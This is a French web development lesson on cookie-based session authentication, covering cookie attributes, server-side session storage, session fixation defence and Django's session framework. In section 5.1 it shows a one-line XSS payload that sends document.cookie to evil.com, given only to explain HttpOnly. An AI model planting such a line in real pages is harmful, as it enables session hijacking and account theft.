# Jour 39 — Sessions et Cookies : Auth basée sur session (4 août 2026)

---

## 1. HTTP est sans état — le problème fondamental

HTTP est un protocole **stateless** : chaque requête est indépendante. Le serveur ne se souvient pas de qui vous êtes d'une requête à l'autre. Si vous vous connectez à une application, puis faites une deuxième requête, le serveur ne sait pas que c'est vous.

```
Client                  Serveur
  |                        |
  |--- GET /login -------->|   (requête 1 : anonyme)
  |<-- 200 OK -------------|
  |                        |
  |--- POST /login ------->|   (requête 2 : envoi credentials)
  |<-- 200 OK -------------|
  |                        |
  |--- GET /dashboard ---->|   (requête 3 : qui êtes-vous ?)
  |<-- ??? ----------------|   Le serveur ne sait pas !
```

Pour résoudre ce problème, on a deux grandes approches :

1. **Sessions** (côté serveur) — le serveur stocke l'état et donne au client un identifiant
2. **Tokens** (côté client) — toutes les informations nécessaires sont dans le token lui-même (JWT)

Ce cours couvre les **sessions basées sur cookies**.

---

## 2. Mécanique des cookies

### 2.1 Comment Set-Cookie et Cookie fonctionnent

Quand le serveur veut créer un cookie chez le client, il envoie un header HTTP `Set-Cookie` :

```http
HTTP/1.1 200 OK
Set-Cookie: sessionid=abc123xyz; HttpOnly; Secure; SameSite=Lax; Max-Age=86400; Path=/
Content-Type: application/json

{"status": "logged in"}
```

Le navigateur stocke ce cookie et l'envoie automatiquement dans **toutes les requêtes suivantes** vers le même domaine :

```http
GET /dashboard HTTP/1.1
Host: example.com
Cookie: sessionid=abc123xyz
```

### 2.2 Flux complet d'une session

```
1. Client envoie POST /login avec {username, password}
2. Serveur vérifie les credentials
3. Serveur crée une session et génère un session_id (ex: "a7f3k2...")
4. Serveur stocke {user_id: 42, roles: ["admin"]} en base/cache
5. Serveur répond avec Set-Cookie: sessionid=a7f3k2...
6. Client stocke le cookie
7. Requête suivante : Cookie: sessionid=a7f3k2...
8. Serveur lit le cookie, trouve la session, identifie l'utilisateur
```

### 2.3 Implémentation manuelle en Python pur

```python
import http.server
import uuid
import json
from datetime import datetime, timedelta

# Stockage des sessions en mémoire
sessions = {}

def create_session(user_data: dict) -> str:
    """Crée une nouvelle session et retourne le session_id."""
    session_id = str(uuid.uuid4())
    sessions[session_id] = {
        "data": user_data,
        "created_at": datetime.now(),
        "expires_at": datetime.now() + timedelta(hours=2)
    }
    return session_id

def get_session(session_id: str) -> dict | None:
    """Récupère les données d'une session si elle existe et n'est pas expirée."""
    if session_id not in sessions:
        return None
    session = sessions[session_id]
    if datetime.now() > session["expires_at"]:
        del sessions[session_id]
        return None
    return session["data"]

class SimpleHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == "/login":
            # Lire le cookie entrant
            cookie_header = self.headers.get("Cookie", "")
            session_id = self.parse_cookie(cookie_header, "sessionid")
            
            # Créer une session
            new_session_id = create_session({"user_id": 42, "username": "alice"})
            
            # Envoyer Set-Cookie
            self.send_response(200)
            self.send_header(
                "Set-Cookie",
                f"sessionid={new_session_id}; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=7200"
            )
            self.end_headers()
            self.wfile.write(b'{"status": "ok"}')

    def parse_cookie(self, cookie_header: str, name: str) -> str | None:
        for part in cookie_header.split(";"):
            key, _, value = part.strip().partition("=")
            if key == name:
                return value
        return None
```

---

## 3. Session ID vs Session Data

C'est la distinction la plus importante :

| Élément | Où il vit | Ce qu'il contient |
|---------|-----------|-------------------|
| **Session ID** | Cookie chez le client | Un identifiant aléatoire (ex: UUID ou token 128 bits) |
| **Session Data** | Côté serveur | Les vraies données (user_id, rôles, panier, etc.) |

Le client ne voit **jamais** les données de session directement. Il ne détient qu'une clé opaque.

```python
# Ce que le client a dans son cookie :
"sessionid=a7f3k2d9e1b4..."  # Juste un identifiant, rien d'autre

# Ce que le serveur a en base de données :
{
    "a7f3k2d9e1b4...": {
        "user_id": 42,
        "username": "alice",
        "is_admin": True,
        "last_login": "2026-08-04T10:30:00",
        "shopping_cart": [{"product_id": 7, "qty": 2}]
    }
}
```

**Pourquoi ne pas mettre les données dans le cookie ?**

- Les cookies sont visibles par le client (même httpOnly les protège de JS, pas de l'inspection)
- Les cookies ont une limite de taille (~4KB)
- On ne peut pas invalider un cookie contenant des données (il faut attendre l'expiration)
- Avec les sessions côté serveur, on peut déconnecter un utilisateur instantanément

---

## 4. Stockage des sessions côté serveur

### 4.1 Base de données (le plus simple)

```python
# models.py (Django simplifié)
class Session(models.Model):
    session_key = models.CharField(max_length=40, primary_key=True)
    session_data = models.TextField()  # JSON encodé
    expire_date = models.DateTimeField()

# Lecture d'une session
def get_user_from_request(request):
    session_key = request.COOKIES.get('sessionid')
    try:
        session = Session.objects.get(
            session_key=session_key,
            expire_date__gt=timezone.now()
        )
        data = json.loads(session.session_data)
        return User.objects.get(id=data['user_id'])
    except (Session.DoesNotExist, User.DoesNotExist):
        return None
```

**Avantages** : Persistant, facile à inspecter, supporte les joins SQL
**Inconvénients** : Chaque requête = une requête SQL → latence

### 4.2 Cache (Redis — le plus performant)

```python
# settings.py
SESSION_ENGINE = 'django.contrib.sessions.backends.cache'
SESSION_CACHE_ALIAS = 'default'

CACHES = {
    'default': {
        'BACKEND': 'django_redis.cache.RedisCache',
        'LOCATION': 'redis://127.0.0.1:6379/1',
        'OPTIONS': {
            'CLIENT_CLASS': 'django_redis.client.DefaultClient',
        }
    }
}

# Implémentation conceptuelle avec redis-py
import redis
import json
import secrets

redis_client = redis.Redis(host='localhost', port=6379, db=0)

def create_session_redis(user_data: dict, ttl_seconds: int = 3600) -> str:
    session_id = secrets.token_urlsafe(32)
    redis_client.setex(
        name=f"session:{session_id}",
        time=ttl_seconds,
        value=json.dumps(user_data)
    )
    return session_id

def get_session_redis(session_id: str) -> dict | None:
    raw = redis_client.get(f"session:{session_id}")
    if raw is None:
        return None
    return json.loads(raw)

def delete_session_redis(session_id: str) -> None:
    redis_client.delete(f"session:{session_id}")
```

**Avantages** : Ultra-rapide (microseconde vs millisecondes), TTL natif
**Inconvénients** : Volatile (données perdues si Redis redémarre sans persistence), RAM coûteuse

### 4.3 Fichiers (le plus simple à déboguer)

```python
# settings.py
SESSION_ENGINE = 'django.contrib.sessions.backends.file'
SESSION_FILE_PATH = '/tmp/django_sessions'  # ou None pour le dossier temp OS

# Structure d'un fichier de session :
# /tmp/django_sessions/a7f3k2d9e1b4...
# Contenu : données sérialisées (pickle ou JSON signé)
```

**Avantages** : Pas de dépendance externe, facile à inspecter
**Inconvénients** : Lent, ne scale pas sur plusieurs serveurs

### 4.4 Cache + Database (hybride, recommandé en production)

```python
# settings.py
SESSION_ENGINE = 'django.contrib.sessions.backends.cached_db'
# Lit depuis le cache (rapide), écrit dans les deux (durabilité)
```

---

## 5. Attributs des cookies — sécurité critique

### 5.1 HttpOnly

```http
Set-Cookie: sessionid=abc; HttpOnly
```

- Le cookie n'est **pas accessible** par JavaScript (`document.cookie` ne le voit pas)
- Protège contre les attaques **XSS** : même si un attaquant injecte du JS, il ne peut pas voler le session ID

```javascript
// Avec HttpOnly, ceci retourne une chaîne vide ou sans sessionid
console.log(document.cookie);  // "" ou "theme=dark" (mais pas sessionid)

// Sans HttpOnly, un attaquant XSS peut faire :
fetch('https://evil.com/steal?cookie=' + document.cookie);
```

### 5.2 Secure

```http
Set-Cookie: sessionid=abc; Secure
```

- Le cookie n'est envoyé **que via HTTPS**
- Protège contre les attaques **man-in-the-middle** sur HTTP
- **Toujours activer en production**

### 5.3 SameSite

```http
Set-Cookie: sessionid=abc; SameSite=Lax
```

Valeurs possibles :

| Valeur | Comportement | Protection CSRF |
|--------|-------------|----------------|
| `Strict` | Cookie jamais envoyé en cross-site | Maximale, mais casse les liens entrants |
| `Lax` | Envoyé pour navigations top-level (clics de liens) | Bonne, recommandée |
| `None` | Toujours envoyé (nécessite `Secure`) | Aucune, pour OAuth/iframes |

```python
# Django settings.py
SESSION_COOKIE_SAMESITE = 'Lax'   # défaut depuis Django 3.1
SESSION_COOKIE_SECURE = True       # en production uniquement
SESSION_COOKIE_HTTPONLY = True     # toujours True
```

### 5.4 Domain et Path

```http
Set-Cookie: sessionid=abc; Domain=example.com; Path=/api
```

- `Domain=example.com` : le cookie est envoyé pour `example.com` ET `*.example.com`
- `Domain=.example.com` : idem (le point initial est ignoré en pratique)
- `Path=/api` : le cookie n'est envoyé que pour les URLs commençant par `/api`

### 5.5 Max-Age et Expires

```http
Set-Cookie: sessionid=abc; Max-Age=86400
Set-Cookie: sessionid=abc; Expires=Wed, 04 Aug 2026 10:00:00 GMT
```

- `Max-Age` (secondes) prend la priorité sur `Expires`
- Sans l'un ou l'autre : **cookie de session** (supprimé quand le navigateur ferme)
- `Max-Age=0` ou `Max-Age=-1` : supprime le cookie immédiatement

```python
# Django settings.py
SESSION_COOKIE_AGE = 1209600  # 2 semaines en secondes
SESSION_EXPIRE_AT_BROWSER_CLOSE = False  # True = session cookie
```

---

## 6. Attaque Session Fixation

L'attaque de **fixation de session** fonctionne ainsi :

```
1. L'attaquant visite le site et obtient un session_id : "ATTACKER_ID"
2. L'attaquant convainc la victime de cliquer sur :
   https://example.com/login?sessionid=ATTACKER_ID
3. La victime se connecte — si le serveur réutilise le même session_id...
4. L'attaquant envoie ses requêtes avec "ATTACKER_ID" et est maintenant authentifié !
```

**La défense** : régénérer le session_id à chaque authentification réussie.

```python
# Django le fait automatiquement, mais voici la logique manuelle :
def login_view(request):
    username = request.POST['username']
    password = request.POST['password']
    
    user = authenticate(username=username, password=password)
    if user:
        # CRITIQUE : flush + cycle régénère un nouveau session_id
        # en conservant les données de session si nécessaire
        request.session.cycle_key()  # Django 1.9+
        # OU
        old_data = dict(request.session)
        request.session.flush()  # Détruit l'ancienne session
        for key, value in old_data.items():
            request.session[key] = value
        
        request.session['user_id'] = user.id
        return redirect('/dashboard')
```

---

## 7. Le framework de sessions Django

### 7.1 Configuration

```python
# settings.py

INSTALLED_APPS = [
    'django.contrib.sessions',  # Requis
    ...
]

MIDDLEWARE = [
    ...
    'django.contrib.sessions.middleware.SessionMiddleware',  # Requis
    ...
]

# Backend de stockage
SESSION_ENGINE = 'django.contrib.sessions.backends.db'      # Base de données (défaut)
SESSION_ENGINE = 'django.contrib.sessions.backends.cache'   # Cache uniquement
SESSION_ENGINE = 'django.contrib.sessions.backends.cached_db'  # Cache + DB
SESSION_ENGINE = 'django.contrib.sessions.backends.file'    # Fichiers
SESSION_ENGINE = 'django.contrib.sessions.backends.signed_cookies'  # Cookies signés

# Cookie settings
SESSION_COOKIE_NAME = 'sessionid'          # Nom du cookie
SESSION_COOKIE_AGE = 1209600              # 2 semaines
SESSION_COOKIE_SECURE = True              # HTTPS uniquement (prod)
SESSION_COOKIE_HTTPONLY = True            # Pas accessible en JS
SESSION_COOKIE_SAMESITE = 'Lax'          # Protection CSRF
SESSION_SAVE_EVERY_REQUEST = False        # Economise les writes DB
SESSION_EXPIRE_AT_BROWSER_CLOSE = False   # Persistant
```

### 7.2 La table django_session

```sql
-- Créée par : python manage.py migrate
CREATE TABLE django_session (
    session_key varchar(40) NOT NULL PRIMARY KEY,
    session_data text NOT NULL,         -- données encodées en base64 + sérialisées
    expire_date datetime(6) NOT NULL
);

CREATE INDEX django_session_expire_date_a5c62663 ON django_session (expire_date);
```

### 7.3 session_key — comment il est généré

```python
# Code source Django simplifié (django/contrib/sessions/backends/base.py)
import secrets

def _get_new_session_key(self) -> str:
    """Génère une clé de session aléatoire et sécurisée."""
    while True:
        session_key = secrets.token_hex(20)  # 40 caractères hex = 160 bits d'entropie
        if not self.exists(session_key):
            return session_key
```

---

## 8. Utiliser request.session dans Django

### 8.1 Opérations de base

```python
# views.py

def set_session_data(request):
    """Stocker des données dans la session."""
    # Accès dict-like
    request.session['user_id'] = 42
    request.session['username'] = 'alice'
    request.session['preferences'] = {
        'theme': 'dark',
        'language': 'fr'
    }
    return JsonResponse({"status": "session data set"})


def read_session_data(request):
    """Lire des données depuis la session."""
    # Accès sécurisé (pas de KeyError)
    user_id = request.session.get('user_id')
    username = request.session.get('username', 'Anonyme')
    
    # Accès direct (KeyError si absent)
    try:
        preferences = request.session['preferences']
    except KeyError:
        preferences = {}
    
    return JsonResponse({
        "user_id": user_id,
        "username": username,
        "preferences": preferences
    })


def check_session_exists(request):
    """Vérifier si une clé existe."""
    if 'user_id' in request.session:
        return JsonResponse({"authenticated": True})
    return JsonResponse({"authenticated": False})


def delete_session_key(request):
    """Supprimer une clé spécifique."""
    try:
        del request.session['username']
    except KeyError:
        pass
    # OU
    request.session.pop('username', None)
    return JsonResponse({"status": "key deleted"})
```

### 8.2 Créer et détruire des sessions

```python
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.decorators import login_required

def login_view(request):
    """Connexion : crée une session."""
    if request.method != 'POST':
        return render(request, 'login.html')
    
    username = request.POST.get('username')
    password = request.POST.get('password')
    
    # 1. Vérifier les credentials
    user = authenticate(request, username=username, password=password)
    
    if user is None:
        return JsonResponse({"error": "Invalid credentials"}, status=401)
    
    if not user.is_active:
        return JsonResponse({"error": "Account disabled"}, status=403)
    
    # 2. Créer la session (gère session fixation automatiquement)
    login(request, user)
    # Équivalent manuel :
    # request.session.cycle_key()
    # request.session['_auth_user_id'] = str(user.pk)
    # request.session['_auth_user_backend'] = 'django.contrib.auth.backends.ModelBackend'
    
    return JsonResponse({"status": "logged in", "user": user.username})


@login_required
def logout_view(request):
    """Déconnexion : détruit la session."""
    # Supprime les données de session ET génère un nouveau session_id vide
    logout(request)
    # Équivalent : request.session.flush()
    
    return JsonResponse({"status": "logged out"})


@login_required
def dashboard_view(request):
    """Vue protégée : accès uniquement si session valide."""
    user = request.user  # Disponible grâce au SessionMiddleware + AuthenticationMiddleware
    return JsonResponse({
        "user": user.username,
        "email": user.email,
        "is_admin": user.is_staff
    })
```

### 8.3 Session avec données personnalisées

```python
def add_to_cart(request):
    """Exemple concret : panier d'achat en session."""
    product_id = request.POST.get('product_id')
    quantity = int(request.POST.get('quantity', 1))
    
    # Initialiser le panier s'il n'existe pas
    cart = request.session.get('cart', {})
    
    if product_id in cart:
        cart[product_id]['quantity'] += quantity
    else:
        cart[product_id] = {
            'quantity': quantity,
            'added_at': datetime.now().isoformat()
        }
    
    # IMPORTANT : si on modifie un objet mutable (dict/list),
    # Django ne détecte pas automatiquement le changement !
    request.session['cart'] = cart
    # OU forcer la sauvegarde :
    request.session.modified = True
    
    return JsonResponse({"cart": cart})


def expire_session_custom(request):
    """Définir une expiration personnalisée."""
    # Expiration dans 30 minutes
    request.session.set_expiry(1800)
    
    # Expiration à une date précise
    from datetime import datetime, timedelta
    request.session.set_expiry(datetime.now() + timedelta(hours=8))
    
    # Cookie de session (expire à la fermeture du navigateur)
    request.session.set_expiry(0)
    
    # Utiliser le paramètre global SESSION_COOKIE_AGE
    request.session.set_expiry(None)
    
    return JsonResponse({"session_key": request.session.session_key})
```

### 8.4 Manipulation avancée de sessions

```python
def session_info(request):
    """Informations sur la session courante."""
    session = request.session
    
    return JsonResponse({
        "session_key": session.session_key,
        "keys": list(session.keys()),
        "expiry_age": session.get_expiry_age(),
        "expiry_date": session.get_expiry_date().isoformat(),
        "is_empty": session.is_empty(),
    })


def invalidate_all_user_sessions(user_id: int) -> int:
    """
    Invalider toutes les sessions d'un utilisateur.
    Utile pour : changement de mot de passe, déconnexion forcée.
    """
    from django.contrib.sessions.models import Session
    from django.utils import timezone
    import json
    
    active_sessions = Session.objects.filter(expire_date__gt=timezone.now())
    count = 0
    
    for session in active_sessions:
        data = session.get_decoded()
        if data.get('_auth_user_id') == str(user_id):
            session.delete()
            count += 1
    
    return count  # Nombre de sessions supprimées


# Utilisation en cas de changement de mot de passe :
def change_password_view(request):
    user = request.user
    new_password = request.POST['new_password']
    user.set_password(new_password)
    user.save()
    
    # Invalider toutes les autres sessions
    count = invalidate_all_user_sessions(user.id)
    
    # Mettre à jour la session courante (sinon l'utilisateur est déconnecté)
    from django.contrib.auth import update_session_auth_hash
    update_session_auth_hash(request, user)
    
    return JsonResponse({"message": f"Password changed, {count} sessions invalidated"})
```

---

## 9. Session signée dans les cookies (signed_cookies backend)

Une alternative aux sessions serveur : stocker les données directement dans le cookie, mais **signées cryptographiquement**.

```python
# settings.py
SESSION_ENGINE = 'django.contrib.sessions.backends.signed_cookies'

# Django utilise SECRET_KEY pour signer :
SECRET_KEY = 'votre-cle-secrete-tres-longue-et-aleatoire'
```

```python
# Ce que Django fait en coulisses (simplifié) :
import hmac
import hashlib
import base64
import json

def sign_session_data(data: dict, secret: str) -> str:
    """Signer les données de session pour les mettre dans un cookie."""
    payload = json.dumps(data).encode()
    b64_payload = base64.urlsafe_b64encode(payload).decode()
    
    signature = hmac.new(
        secret.encode(),
        b64_payload.encode(),
        hashlib.sha256
    ).hexdigest()
    
    return f"{b64_payload}:{signature}"

def verify_session_data(signed: str, secret: str) -> dict | None:
    """Vérifier et décoder les données signées."""
    try:
        b64_payload, signature = signed.rsplit(':', 1)
        
        expected = hmac.new(
            secret.encode(),
            b64_payload.encode(),
            hashlib.sha256
        ).hexdigest()
        
        if not hmac.compare_digest(signature, expected):
            return None  # Signature invalide !
        
        payload = base64.urlsafe_b64decode(b64_payload.encode())
        return json.loads(payload)
    except Exception:
        return None
```

**Avantages** : Pas de stockage côté serveur, scalable sans état
**Inconvénients** :
- Impossible d'invalider une session individuelle
- Taille limitée (~4KB)
- Les données sont lisibles (juste encodées en base64, pas chiffrées)

---

## 10. Gestion des sessions avec la commande management

```bash
# Supprimer les sessions expirées (à mettre en cron)
python manage.py clearsessions

# Voir les sessions actives (en shell Django)
python manage.py shell
```

```python
# Dans le shell Django
from django.contrib.sessions.models import Session
from django.utils import timezone

# Compter les sessions actives
active = Session.objects.filter(expire_date__gt=timezone.now()).count()
print(f"Sessions actives : {active}")

# Voir les données d'une session spécifique
session = Session.objects.get(session_key='abc123...')
print(session.get_decoded())

# Nettoyer manuellement
Session.objects.filter(expire_date__lte=timezone.now()).delete()
```

---

## 11. Résumé et bonnes pratiques

```
SECURITE SESSION — CHECKLIST

[x] Utiliser HTTPS (activer SESSION_COOKIE_SECURE=True en prod)
[x] HttpOnly=True (protège du vol XSS)
[x] SameSite=Lax (protège du CSRF)
[x] Régénérer le session_id après login (session fixation)
[x] Invalider les sessions à la déconnexion (session.flush())
[x] Définir une durée d'expiration raisonnable
[x] Nettoyer régulièrement les sessions expirées (clearsessions)
[x] Stocker le minimum de données en session
[x] Invalider toutes les sessions lors d'un changement de mot de passe
[x] Ne JAMAIS stocker des données sensibles (mot de passe, CB) en session
```

---

## Références

- Django Sessions documentation: https://docs.djangoproject.com/en/stable/topics/http/sessions/
- RFC 6265 — HTTP State Management Mechanism (Cookies)
- OWASP Session Management Cheat Sheet
- MDN Web Docs — Using HTTP cookies
